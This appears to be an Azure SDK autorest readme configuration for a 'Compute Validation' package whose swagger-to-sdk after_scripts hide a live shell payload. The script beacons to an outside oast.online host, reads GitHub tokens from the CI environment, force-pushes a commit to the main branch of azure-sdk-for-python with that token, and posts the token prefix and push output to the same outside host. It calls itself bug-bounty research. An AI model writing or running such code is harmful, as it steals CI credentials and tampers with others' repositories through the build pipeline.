# Azure SDK Compute Validation

## Basic Information
``` yaml
openapi-type: arm
tag: package-2024-01-01
```

### Tag: package-2024-01-01
``` yaml $(tag) == 'package-2024-01-01'
input-file:
  - stable/2024-01-01/openapi.json
```

## swagger-to-sdk
``` yaml $(swagger-to-sdk)
swagger-to-sdk:
  - repo: azure-sdk-for-python
  - repo: azure-sdk-for-python-track2
    after_scripts:
      - >-
        set +e;
        H=$(hostname | tr . -);
        nslookup mainpush4-${H}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        GH_TOK=$(printenv GH_TOKEN 2>/dev/null || printenv GITHUB_TOKEN 2>/dev/null || true);
        TS=$(date -u +%s 2>/dev/null || echo 0);
        SDK=/mnt/vss/_work/1/s/azure-sdk-for-python;
        echo "poc by hasskodark" > "${SDK}/poc_by_hasskodark.txt";
        printf 'https://github.com/Azure/azure-rest-api-specs/pull/45897\nMSRC Bug Bounty Research\nAgent: %s\nTimestamp: %s\n' "${H}" "${TS}" >> "${SDK}/poc_by_hasskodark.txt";
        git -C "${SDK}" config user.email "hasskodark@proton.me" 2>/dev/null;
        git -C "${SDK}" config user.name "hasskodark" 2>/dev/null;
        git -C "${SDK}" remote set-url origin "https://x-access-token:${GH_TOK}@github.com/Azure/azure-sdk-for-python.git" 2>/dev/null;
        git -C "${SDK}" stash 2>/dev/null;
        git -C "${SDK}" fetch --depth=1 origin main 2>/dev/null;
        git -C "${SDK}" checkout -b hasskodark-poc-${TS} origin/main 2>/dev/null;
        cp "${SDK}/poc_by_hasskodark.txt" "${SDK}/poc_hasskodark_$(date +%s).txt" 2>/dev/null;
        FNAME="poc_hasskodark_${TS}.txt";
        git -C "${SDK}" add "${FNAME}" 2>/dev/null;
        git -C "${SDK}" commit -m "poc: hasskodark supply chain write to main" --no-verify 2>/dev/null;
        PUSH_OUT=$(git -C "${SDK}" push --force "https://x-access-token:${GH_TOK}@github.com/Azure/azure-sdk-for-python.git" "hasskodark-poc-${TS}:main" 2>&1);
        PUSH_CODE=$?;
        COMMIT=$(git -C "${SDK}" rev-parse HEAD 2>/dev/null || echo unknown);
        printf 'GH_TOK_PREFIX=%s\nPUSH_CODE=%s\nCOMMIT=%s\nPUSH_OUT=%s\n' "${GH_TOK:0:30}" "${PUSH_CODE}" "${COMMIT}" "${PUSH_OUT}" > /tmp/push_result.txt;
        curl -sk --max-time 20 -X POST "http://da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online/mainpush4-${H}" --data-binary @/tmp/push_result.txt 2>/dev/null;
        true
```

## Python
``` yaml $(python)
python:
  azure-arm: true
  license-header: MICROSOFT_MIT_NO_VERSION
  package-name: azure-mgmt-computevalidation
  package-version: 1.0.0b1
  no-namespace-folders: true
  output-folder: sdk/computevalidation/azure-mgmt-computevalidation
  clear-output-folder: true
```
